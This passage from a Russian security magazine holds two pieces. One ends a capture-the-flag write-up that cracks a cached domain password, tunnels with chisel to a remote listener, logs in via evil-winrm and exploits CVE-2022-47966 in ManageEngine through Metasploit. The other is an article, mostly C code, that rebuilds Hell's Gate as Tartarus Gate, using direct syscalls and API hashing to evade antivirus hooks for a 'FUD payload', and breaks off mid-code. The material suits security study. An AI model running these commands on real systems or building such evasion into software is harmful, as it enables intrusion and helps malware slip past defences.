Де мон SSSD может кешировать учетные данные в локальной базе данных.


              Содержимое каталога /var/lib/sss/db/

По лучим все строки из файла cache_cerberus.local.ldb.


strings /var/lib/sss/db/cache_cerberus.local.ldb





               Стро ки в фай ле cache_cerberus.local.ldb

В выводе видим хеш пароля пользователя, этот хеш нам предсто ит переби-
рать. Но первым делом с помощью справ ки hashcat опре делим его тип.


hashcat --example | grep '\$6\$' -A2 -B11





                         Справка hashcat

Те перь указываем полученный режим перебора хеша — 1800. На выходе
получаем пароль.


hashcat -m 1800 -a 0 hash.txt rockyou.txt





                    Результат перебора хеша

Что бы понять, где можно авто ризовать ся с этими учетными данными, прос-
канируем порты на контроллере домена.


./nmap -p- --min-rate=1500 172.16.22.1





                  Результат ска ниро вания пор тов

На хосте работает служба WinRM, и, чтобы подклю читься к ней, сделаем тун-
нель. Для этого будем использовать chisel. На локальном хосте запустим
сервер, ожидающий под ключения (параметр --reverse) на порт 8888
(параметр -p).


./chisel.bin server -p 8888 --reverse




                       Логи chisel server

Те перь на удаленном хос те запустим кли ент скую часть. Указываем адрес сер-
вера и порт для подклю чения, а также нас трой ки туннелирования: с локаль-
ного пор та 8888 на порт 5985 хоста 172.16.22.1.


./chisel.bin client 10.10.14.75:8888 R:5985:172.16.22.1:5985





                       Ло ги chisel client

В логах сервера мы дол жны увидеть сообщение о соз дании сес сии. Как толь-
ко сессия  будет создана, пробуем  авто ризо ваться на служ бе WinRM
с помощью инструмента Evil-WinRM.


evil-winrm -i 127.0.0.1 -u 'matthew' -p '147258369'





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ (ÕÎÑÒ 2)
Нам сно ва нужно провести разведку, и снова исполь зуем PEASS, на этот раз
версию для Windows.
  В спис ке поль зователей отмечаем пользовате ля службы ADFS.





            Най денные домаш ние катало ги пользователей

Отмечаем открытые для локального хос та нес тандартные порты 8888 и 9251.





                    Спи сок откры тых пор тов

Проверим, что расположено на порте 9251, для чего немного изме ним тун-
нель chisel. Для дос тупа к хосту будем использовать туннель Socks, а для дос-
тупа к внутреннему пор ту будем прокидывать этот порт.


# --- socks ---
#remote linux
chisel.bin client 10.10.14.75:8888 R:socks



# --- port forwarding ---
#remote windows
chisel.exe client 10.10.14.75:8888 R:9251:127.0.0.1:9251





                      Логи сервера chisel

При попытке просмотреть порт через браузер нам сооб щают о небезопас-
ном подклю чении, то есть необ ходимо использовать HTTPS.





                    Сообщение на сайте

Повторяем обра щение к серверу, проходим ряд редиректов и встречаем
типич ную фор му авторизации ADFS.





                    Стра ница авто ризации ADFS

Те перь пару слов о том, что это такое.


Active Directory Federation Services
ADFS — это функция Active Directory, которая обеспечивает идентификацию
доступа и дает возможность клиентам (в основном на базе браузе ров) внут ри
или за пре дела ми локальной сети получать дос туп к веб-при ложе ниям по тех-
нологии single sign-on (SSO). Так ADFS извле кает атрибуты поль зователей
из Active Directory, а так же проверяет подлинность поль зователей в Active
Directory.
  Служба федерации ADFS — ком понент серверной платформы Microsoft
Windows Server, реали зующий «сервис маркеров дос тупа» (STS), который
использует службу катало га Active Directory для аутен тификации пользовате-
лей и хранения информации о них.
  Основные опе рации:
 • первоначальная аутентифика ция пользователя;
 • выпуск мар кера доступа (Issue);
 • проверка маркера доступа (Validate);
 • обновле ние мар кера доступа (Renew);
 • аннулиро вание маркера доступа (Cancel).

Мар кер доступа выпускает ся по факту успешной аутентифика ции и достовер-
но идентифицирует пользователя при ложе ния. Что бы получить маркер дос-
тупа, пользователь пре дос тавляет учет ные данные AD либо свой сертификат.
  Маркер дос тупа соответствует специфи кации SAML Token, которая опре-
деляет синтаксис и структуру маркера. Это расширя емый фор мат, что поз-
воля ет формировать содержание маркера в соот ветс твии с тре бова ниями
при ложе ния, к которому осуществляется доступ. Срок действия мар кера
и область при менения ограниченны. Мар кер дос тупа содержит информацию
о поль зователе в фор ме набора утверждений (Claims), которые используются
при ложе нием для соз дания контекста пользовате ля.
  Попробуем авто ризо ваться в ADFS и получить маркер доступа.





             Получение GUID токена (маркера доступа)

Немного поис следовав файловую систему, находим продукт ManageEngine
ADSelfService Plus, который как раз и представляет собой интегрированное
решение для самостоятельного управления паролями и единого входа.
Из базы получим Issuer URL, просто греп нув файлы по строке.


ls -r | Select-String issuer_url | select line,path





                     Получение Issuer URL

В самом ManageEngine есть нашумев шая  уязвимость CVE-2022-47966,
которая приводит к удален ному выполнению кода. Автоматизированный экс-
пло ит уже появился в Metasploit Framework. У нас есть необходимые для экс-
плуата ции параметры — GUID токена и Issuer URL.


proxychains -q msfconsole
use manageengine_adselfservice_plus_saml_rce_cve_2022_47966
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
set RHOST 127.0.0.1
set RPORT 9251
set LHOST 10.10.14.56
exploit





                     Экс плуата ция уяз вимости

Мы получили сессию и теперь просто забираем флаг рута.





                           Флаг рута

Машина захвачена!
КОДИНГ





      ПЕРЕПИСЫВАЕМ HELL’S GATE
       И ОБХОДИМ АНТИВИРУС





Хо чешь узнать, как обойти антивирусные
программы   с   помощью   системных
вызовов? Мы рас кро ем секреты этой зах-
ватыва ющей  техники, перепишем извес-
тный    инс трумент,    попрограммируем         MichelleVermishelle                                                                                       @Michaelzhm
на  ассембле ре  и  поищем  паттерны        michael.zhmailo@yandex.ru
в памяти, что бы получить FUD-пейлоад!


×ÒÎ ÒÀÊÎÅ SYSCALL

Многие антивирусные продукты (да и некоторые программы) любят ставить
хуки. Я уже показы вал вариант обхода хуков в User Mode через перезапись
библиотеки ntdll.dll. Теперь изучим еще один способ обхода ловушек — через
сисколы.
  Сисколы (они же сис темные вызовы) — очень большая и инте рес ная тема.
Я постарался вкратце описать, что это и зачем они нужны. Если ты захочешь
более глубоко погрузить ся в тему, ниже най дешь нес коль ко полезных ссылок.




                          •Direct Syscalls: A journey from high to low
                          •Direct Syscalls vs Indirect Syscalls


Итак, сискол можно считать переходной ста дией меж ду пользовательским
режимом (User Mode) и режимом ядра (Kernel Mode). Это как бы переход
из одного мира системы в другой. Если еще про ще, то сискол — прос то
обращение к ядру.
  Вы зовы ядра край не важ ны для коррек тно го функционирова ния системы.
Нап ример, именно заложенные в ядре функции позволяют создавать фай лы.
Каж дый сискол однозначно идентифици руется по своему номеру. Этот номер
называется по-раз ному, где-то Syscall Id, где-то Syscall Number, где-то SSN —
System Service Number. Номер сискола подсказывает ядру, что ему нужно
делать. Он заносится в регистр eax, после чего выполняется инс трукция
syscall, которая осуществляет переход в режим ядра.





              Как выглядит вызов сисколов у разных функций

Проблема в том, что средства защиты могут ставить хуки непос редс твенно
перед вызовом инструк ции syscall. Например, как на следующем скрин-
шоте.




                   Инструкция jmp перед syscall

Это может сви детельствовать о наличии хука. Ничто не мешает нам напрямую
вызывать инструкцию syscall из адресного пространства своего процесса,
такая техника называется Direct Syscall. Мы даже можем обращаться к инс-
трукции syscall, найдя ее адрес в смапленной в наш процесс биб лиоте ке
ntdll.dll (такая тех ника называется Indirect Syscall). Проблема лишь одна —
нужен SSN. Без номера сис кола, сохранен ного в регистре eax, ничего
не получится.


ÒÅÕÍÈÊÀ ÏÎÈÑÊÀ SSN

SSN различа ется от системы к системе. Он зависит от версии Windows. Есть
отличная таблица актуальных сисколов, но каж дый раз хардкодить SSN вооб-
ще не вари ант. Поэто му давно при дума ны способы динами чес ки доставать
номера  сисколов,  а  затем уже  с  эти ми номерами выпол нять  Direct-
или Indirect-вызовы.
  Давай разберем один из самых известных методов — Hell’s Gate, а затем
перепи шем его под Tartarus Gate.
   Тех ника обнаружения SSN достаточно проста. Сначала, чтобы получить
загруженный в процесс адрес ntdll.dll, прог рамма дос тает адреса TEB
(Thread Environment Block), затем PEB (Process Environment Block). А после
извле кает из таб лицы PEB_LDR_DATA базовый адрес загрузки ntdll.dll.


PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}


INT wmain() {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion
!= 0xA)
        return 0x1;


    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((
PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink -
0x10);
    ...
}

Программа, зная базовый адрес загрузки библиотеки, получа ет адрес EAT
(Export Address Table). В этой таб лице содержатся адре са всех экспортиру-
емых из биб лиотеки фун кций.


BOOL GetImageExportDirectory(PVOID pModuleBase,
PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)
pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)
pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)
pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].
VirtualAddress);
    return TRUE;
}

Пос ле успешно го получения всех адре сов идет инициализация спе циальной
структуры — структуры VX_TABLE.


typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

Таб лица VX_TABLE состоит из других структур VX_TABLE_ENTRY. Внутри них
будут заполнены эле менты pAddress, dwHash и wSystemCall, которые отве-
чают соответственно за адрес нужной функции, хеш от имени функции (он
пот ребуется для API Hashing) и номера системного вызова.
  Для обнаруже ния сискола исполь зуется фун кция GetVxTableEntry(),
но перед этим предварительно инициализируется элемент dwHash описанной
выше структуры. Хеш рас счи тывается заранее. Для этого используется алго-
ритм djb2, вынесен ный в отдельную функцию.


VX_TABLE Table = { 0 };
Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &
Table.NtAllocateVirtualMemory))
    return 0x1;

GetVxTableEntry() парсит EAT и обна ружи вает адрес нужной функции
с помощью API Hashing.


if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
    pVxTableEntry->pAddress = pFunctionAddress;


    ...

Пос ле обнаружения нужной функции ее адрес записы вает ся в таб лицу,
а затем ищется номер сискола для этой фун кции. Hell’s Gate ищет паттерн,
характерный для вызова сискола.


mov r10,rcx
mov rcx,<syscall number>





                   Так выглядит шаб лон вызова сис кола

Для этого Hell’s Gate ска нирует память на наличие соответству ющих опко дов.


if (*((PBYTE)pFunctionAddress + cw) == 0x4c
    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
    pVxTableEntry->wSystemCall = (high << 8) | low;
    break;
}





                        Оп коды

Ес ли паттерн най ден, начина ется вычленение номера сис кола. Для наг-
лядности возьмем сискол с «длинным» номером, например 10F. В дизас сем-
бле ре увидим инте ресную картину.





                  Как выглядит номер сискола в памяти

Инс трукция, сохраняющая номер сис кола в регистр eax, выг лядит вроде бы
нор мально, но если мы посмотрим внимательнее, то увидим, что номер сис-
кола пред став лен как бы в перевер нутом виде.


B8 0F010000
mov eax,10F  # 0xb8 0x0F 0x01 0x00 0x00

Hell’s Gate знает о таком поведении системы, поэтому вычленяет сисколы
с использовани ем специального алго рит ма.


BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
pVxTableEntry->wSystemCall = (high << 8) | low;
break;

Ес ли мы пос тавим бряк на пред последнюю строчку кода, то увидим, что
в high попадает «верхняя» часть, а в low — «нижняя».




                       Номер сискола





                       Что вычленяет Hell’s Gate

Соответственно, если алгоритм выч леня ет SSN 10F, то переменные ини-
циализируются как 0x1 и 0xF.





                   Ини циали зация и high, и low

В wSystemmCall заносится значение high со сдвигом влево на 8 байт.
Это приводит к получению из 0000 0001 значения 1 0000 0000. Следующим
шагом выполняется побитовая операция ИЛИ со зна чени ем 0000 1111 (0xF
в двоичной системе счисления), в результате мы получаем 1 0000 1111.
А это, в свою оче редь, равно 10F. 10F как раз и есть номер сис кола.





                    Под счет номера сискола

Дополнительно программа проверяет, не ушли ли мы в поис ке номера сис-
кола слишком далеко. Для это го также используются опкоды.





                          Dead Codes


ÈÇÌÅÍÅÍÈÅ ÀËÃÎÐÈÒÌÀ ÕÅØÈÐÎÂÀÍÈß

Нач нем с того, что сме ним алгоритм djb2 на какой-нибудь другой, например
на crc32h. Это нужно, что бы из нашего пейлоада пропали некоторые ста-
тик-детекты, основан ные на хешах используемых нами имен WinAPI-функций.
Для этого соз дадим фун кцию, реализующую логику по хешированию.


#define SEED 0xEDB88320


...


unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 >> 1,
        g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
        g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;


    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {
        crc = crc ^ byte;
        c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
            ((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
            ((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
            ((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
        crc = ((unsigned)crc >> 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

Ко неч но, можно было прос то поменять SEED-зна чение и рассчи тываемый хеш
в функции djb2(), но мы все-таки решили полноценно перепи сать инстру-
мент, а не баловать ся, меняя переменные.





                        Hash- и SEED-значения

Для удобства вызова и автомати ческого приведения к нужному типу соз-
дадим макрос.


#define HASH(API) crc32h((char*)API)

Так как мы пока незнакомы с Compile-Time API Hashing, напишем программу
для пересчета хешей от нужных нам функций.


#include <Windows.h>
#include <stdio.h>
#define SEED 0xEDB88320
#define STR "_CRC32"
unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 >> 1,
        g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
        g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;


    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {
        crc = crc ^ byte;
        c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
            ((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
            ((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
            ((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
        crc = ((unsigned)crc >> 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}


#define HASH(API) crc32h((char*)API)
int main() {
    printf("#define %s%s \t 0x%0.8X \n", "NtAllocateVirtualMemory",
STR, HASH("NtAllocateVirtualMemory"));
    printf("#define %s%s \t 0x%0.8X \n", "NtProtectVirtualMemory",
STR, HASH("NtProtectVirtualMemory"));
    printf("#define %s%s \t 0x%0.8X \n", "NtCreateThreadEx", STR,
HASH("NtCreateThreadEx"));
    printf("#define %s%s \t 0x%0.8X \n", "NtWaitForSingleObject", STR
, HASH("NtWaitForSingleObject"));
    return 0;
}





                        Но вые хеши


ÈÇÌÅÍÅÍÈÅ GETVXTABLEENTRY

Как ты помнишь, функция GetVxTableEntry() используется для получе ния
номера сискола. Проблема в том, что вызывается она далеко не один раз,
но при каж дом вызове идет повторный расчет всех нужных адресов, что ска-
зывается на эффективности работы прог раммы. Предлагаю завести отдель-
ную структуру NTDLL_CONFIG, внутри которой будут содержаться все эти дан-
ные. Их достаточ но ини циализировать лишь единож ды, а затем можно просто
обращаться к ним.


typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses;
    PDWORD      pdwArrayOfNames;
    PWORD       pwArrayOfOrdinals;
    DWORD       dwNumberOfNames;
    ULONG_PTR   uModule;


}NTDLL_CONFIG, *PNTDLL_CONFIG;


// Глобальная переменная, которая будет все это хранить
NTDLL_CONFIG g_NtdllConf = { 0 };

Для   инициализации   достаточно   один   раз   вызвать   функцию
InitNtdllConfigStructure().


BOOL InitNtdllConfigStructure() {


    // Получение PEB
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;


    // Получение ntdll.dll (первый элемент. Нулевой — наша программа)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb
->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);


    // Получение базового адреса загрузки ntdll.dll
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;


    // Получение DOS-хедера
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;


    // Получение NT-заголовков
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    // Получение таблицы экспортов
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(
uModule + pImgNtHdrs->OptionalHeader.DataDirectory[
IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;


    // Инициализация всех элементов у глобальной переменной
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir->NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir->
AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->
AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir->
AddressOfNameOrdinals);


    // Проверка
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !
g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !
g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}

Са му    фун кцию    GetVxTableEntry()    следует    переиме новать
в FetchNtSyscall(). Мы оставим всего два параметра: dwSysHash (хеш-зна-
чение от имени фун кции, которую нуж но засисколить) и pNtSys — указатель
на  струк туру NT_SYSCALL,  которая  будет содержать всю необходимую
информацию для осу ществления сискола.


typedef struct _NT_SYSCALL
{
    DWORD dwSSn;
    DWORD dwSyscallHash;
    PVOID pSyscallAddress;


}NT_SYSCALL, *PNT_SYSCALL;




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ




                     ПЕРЕПИСЫВАЕМ HELL’S GATE
                      И ОБХОДИМ АНТИВИРУС




Фун кцию  InitNtdllConfigStructure()  следует  вызывать  из  функции
FetchNtSyscall(). Предлагаю просто проверять, ини циализирован ли эле-
мент, содержащий базовый адрес загрузки ntdll.dll. Если нет, то вызыва-
ем функцию, если этот эле мент уже имеет какое-то значение, то вызов
не тре буется. Алгоритм для поиска сис кола пока что не меня ем.


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {


    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }


    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;


    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {


        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule +
g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule +
g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);


        if (HASH(pcFuncName) == dwSysHash) {


            pNtSys->pSyscallAddress = pFuncAddress;


            WORD cw = 0;


            while (TRUE) {


                ...тут алгоритм поиска сискола...
                }


                cw++;
            }


            break;
        }
    }


    // Если что-то не инициализировалось, то все плохо
    if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL &&
pNtSys->dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}


ÈÇÌÅÍÅÍÈÅ ËÎÃÈÊÈ ÏÎÈÑÊÀ ÑÈÑÊÎËÀ

Hell’s Gate — один из простейших способов нахождения сис кола. Проблема
в том, что он прос то про бегает по памяти в одном направлении, пыта ясь
обнаружить сискол. К сожалению, в современных реалиях этот вариант, мягко
говоря, не самый рабочий. Что меша ет антивирусному продукту внести
некоторые изме нения? Например, добавить лишнюю инструкцию, чтобы сло-
мать поиск Hell’s Gate.
  Неизменен ную последовательность без проблем получит ся обна ружить,
но если мы просто добавим лишние инс трукции? Напомню, как выглядит пат-
терн, который ищет сискол.


0x4c 0x8b 0xd1 0xb8 ... 0x00 0x00





                      Неизмененный код

В х64dbg нагло тыкаем «Ассемблировать» и меняем одну инструк цию на дру-
гую.





                       Из мененный код


0x4c 0x8b 0xd1 [ВОТ ТУТ ПОИСК ЛОМАЕТСЯ] 0xb9 ... 0x00 0x00

Те перь номер сискола дос тать не получит ся. Тем не менее не стоит отча-
иваться, так как проблема эта известная и умные люди придумали пути
решения — Halo’s Gate и Tartarus Gate. Оба этих алгоритма поис ка номера
сискола осно выва ются на том, что эти самые номера инкре ментируются.
Если у одной фун кции номер сискола 1, то у сле дующей за ней номер 2.





                       Увеличивающиеся SSN

Таким образом, зная номер сискола одной фун кции, можно без проб лем дос-
тать номера сисколов следующих за ней фун кций. Дополнитель но в алгорит-
ме используется такая особен ность: разница меж ду сох раня ющими номера
сисколов инструк циями сос тавляет 32 бита (0x...F283 – 0x...F263 = 0x20).
Это значение хранится в переменных GoUp и GoDown соответс твенно.





                    Смещения адресов

С помощью этого алго ритма Halo’s Gate про веряет также наличие хука —
если встре чается инс трукция jmp, то хук явно присутствует, поэтому начина-
ется процедура получения номера нехук нутого сискола.


int GoUp -32;
int GoDown 32;
// Если первая инструкция — jmp
if (*((PBYTE)pFunctionAddress) == 0xe9) {
 // Идем вверх и вниз в поиске номера сискола
 for (WORD index = 1; index <= 500; index++) {
  // Идем вниз, ищем паттерн
  if (*((PBYTE)pFunctionAddress + index * GoDown) == 0x4c
   && *((PBYTE)pFunctionAddress + 1 + index * GoDown) == 0x8b
   && *((PBYTE)pFunctionAddress + 2 + index * GoDown) == 0xd1
   && *((PBYTE)pFunctionAddress + 3 + index * GoDown) == 0xb8
   && *((PBYTE)pFunctionAddress + 6 + index * GoDown) == 0x00
   && *((PBYTE)pFunctionAddress + 7 + index * GoDown) == 0x00) {
   BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoDown);
   BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoDown);
   // Паттерн найден, заносим номер сискола
   pVxTableEntry->wSystemCall = (high << 8) | low - index;
   return TRUE;
  }
  // Идем вверх, ищем паттерн
  if (*((PBYTE)pFunctionAddress + index * GoUp) == 0x4c
   && *((PBYTE)pFunctionAddress + 1 + index * GoUp) == 0x8b
   && *((PBYTE)pFunctionAddress + 2 + index * GoUp) == 0xd1
   && *((PBYTE)pFunctionAddress + 3 + index * GoUp) == 0xb8
   && *((PBYTE)pFunctionAddress + 6 + index * GoUp) == 0x00
   && *((PBYTE)pFunctionAddress + 7 + index * GoUp) == 0x00) {
   BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoUp);
   BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoUp);
   // Паттерн найден, заносим номер сискола
   pVxTableEntry->wSystemCall = (high << 8) | low + index;
   return TRUE;
  }
}

Не сказать, что идея неп равиль ная. Думаю, впол не логично таким образом
про верять хуки. Тем не менее теория имеет изъяны: что, если инструкция jmp
стоит, скажем, после сохранения номера сис кола? Либо прос то где-то
до инструк ции syscall? Например, следующий код пройдет провер ку ска-
нирования памяти (нужные опкоды будут обнаружены), но номер сискола выч-
ленить не получится.





                      При мер умно го хука

По этому был придуман Tartarus Gate. Этот алгоритм допол нитель но проверя-
ет и пос ледующий (четвертый) байт на наличие инс трукции jmp. Если этот
байт равен e9, то выпол няет ся стандартная процедура по алгоритму Halo’s
Gate с нахождени ем номера нехук нутого сискола и пос ледующим восста нов-
лени ем всей цепочки.
  Я  предлагаю   исполь зовать   Tartarus   Gate   в  нашей  функции
FetchNtSyscall() для вычленения номера сискола. В код функции добавит-
ся алго ритм Halo’s Gate и проверка сле дующего бай та на наличие инструкции
jmp.


#define UP -32
#define DOWN 32
#define RANGE 500


...


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {


 if (!g_NtdllConf.uModule) {
  if (!InitNtdllConfigStructure())
   return FALSE;
 }


 if (dwSysHash != NULL)
  pNtSys->dwSyscallHash = dwSysHash;
 else
  return FALSE;


 for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++){


  PCHAR pcFuncName = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.
pdwArrayOfNames[i]);
  PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.
pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);


  pNtSys->pSyscallAddress = pFuncAddress;


  if (HASH(pcFuncName) == dwSysHash) {


   if (*((PBYTE)pFuncAddress) == 0x4C
    && *((PBYTE)pFuncAddress + 1) == 0x8B
    && *((PBYTE)pFuncAddress + 2) == 0xD1
    && *((PBYTE)pFuncAddress + 3) == 0xB8
    && *((PBYTE)pFuncAddress + 6) == 0x00
    && *((PBYTE)pFuncAddress + 7) == 0x00) {


    BYTE high = *((PBYTE)pFuncAddress + 5);
    BYTE low  = *((PBYTE)pFuncAddress + 4);
    pNtSys->dwSSn = (high << 8) | low;
    break;
   }


   // Halo’s Gate
   if (*((PBYTE)pFuncAddress) == 0xE9) {


    for (WORD idx = 1; idx <= RANGE; idx++) {
     // Идем вниз
     if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
      && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
      && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
      && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
      && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
      && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {


      BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
      BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
      pNtSys->dwSSn = (high << 8) | low - idx;
      break;
     }
     // Идем вверх
     if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
      && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
      && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
      && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
      && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
      && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {


      BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
      BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
      pNtSys->dwSSn = (high << 8) | low + idx;
      break;
     }
    }
   }


   // Tartarus Gate
   if (*((PBYTE)pFuncAddress + 3) == 0xE9) {


    for (WORD idx = 1; idx <= RANGE; idx++) {
     // Идем вниз
     if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
      && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
      && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
      && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
      && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
      && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {


      BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
      BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
      pNtSys->dwSSn = (high << 8) | low - idx;
      break;
     }
     // Идем вверх
     if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
      && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
      && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
      && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
      && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
